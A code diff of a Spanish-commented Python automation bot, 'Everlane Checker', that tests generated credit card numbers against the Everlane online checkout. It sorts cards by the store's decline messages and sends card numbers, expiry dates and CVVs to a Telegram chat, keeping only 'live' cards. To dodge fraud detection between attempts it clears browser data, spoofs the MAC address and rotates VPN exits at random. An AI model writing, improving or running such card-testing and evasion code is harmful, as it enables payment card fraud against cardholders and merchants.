@@ -54,15 +54,19 @@ def preparar_worksplace(out_usa):
 
         if out_usa == True:
 
-            bot.locate('shopping_in', click=False, check=True)
-            bot.locate('change_location')
-            bot.locate('select_your_location', check=True)
-            bot.pause(0.1)
-            bot.press('end')
-            bot.locate('north_america', wait=0.1)
-            bot.press('end')
-            bot.locate('united_states', wait=0.1)
-            bot.locate('accept', wait=0.1)
+            if bot.locate('united_states'):
+                bot.locate('accept')
+
+            else:
+                bot.locate('shopping_in', click=False, check=True)
+                bot.locate('change_location')
+                bot.locate('select_your_location', check=True)
+                bot.pause(0.1)
+                bot.press('end')
+                bot.locate('north_america', wait=0.1)
+                bot.press('end')
+                bot.locate('united_states', wait=0.1)
+                bot.locate('accept', check=True)
 
             # Lo eliminamos porque estamos probando de otra manera y quiero
             # mantenerlo por si lo llego a necesitar despues
@@ -243,12 +247,13 @@ def livear(cc_namso, current, total, out_usa):
             preparar_worksplace(out_usa)
             break
 
+        # Solo queremos las lives asi que comentamos los telegram de las siguientes condiciones
+        
         elif bot.locate('error1', click=False):
             print('There was a problem processing your card. Please call your card issuer or try a different card.')
-            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
+            # telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
             break
 
-        # Solo queremos las lives asi que comentamos los telegram de las siguientes condiciones
 
         elif bot.locate('out_funds', click=False):
             print('Your card appears to be out of funds. Please try a new one.')
@@ -263,15 +268,12 @@ def livear(cc_namso, current, total, out_usa):
             bot.press_both('ctrl', 'l')
             bot.copypaste('chrome://settings/clearBrowserData')
             bot.press('enter')
-            bot.locate('clear_data', wait=0.3)
+            bot.locate('clear_data', wait=0.2)
             bot.pause(0.10)
             bot.press_both('alt', 'f4')
             bot.pause(0.5)
 
-            # Por el problema del VPN, vamos a cortar todo hasta aqui y trabajarlo manual
-            quit()
-
-            # CAMBIAMOS MAC
+            # # CAMBIAMOS MAC
 
             # Para cambiar la mac seleccionar la Ethernet 2
             bot.locate('tmac_logo')
@@ -281,18 +283,20 @@ def livear(cc_namso, current, total, out_usa):
             bot.locate('tmac_mac_changed', check=True, click=False)
             bot.locate('tmac_ok')
 
-            # CAMBIAMOS IP CON URBAN VPN
+            # # CAMBIAMOS IP CON URBAN VPN
 
             bot.locate('urban_logo', wait=0.3)
             bot.locate('urban_turn_off')
             bot.locate('urban_ready_to_connect', check=True, click=False)
-            bot.locate('urban_turn_on', wait=2)
+
+            # bot.locate('urban_turn_on', wait=2)
+            vpn = ['luxembourg', 'united_kingdom', 'united_states_urban', 'singapore']
+
+            bot.locate(random.choice(vpn))
             bot.locate('urban_connected', check=True, click=False)
 
             preparar_worksplace()
             break
-
-    print('Script has finished')
     
 # Logica
 
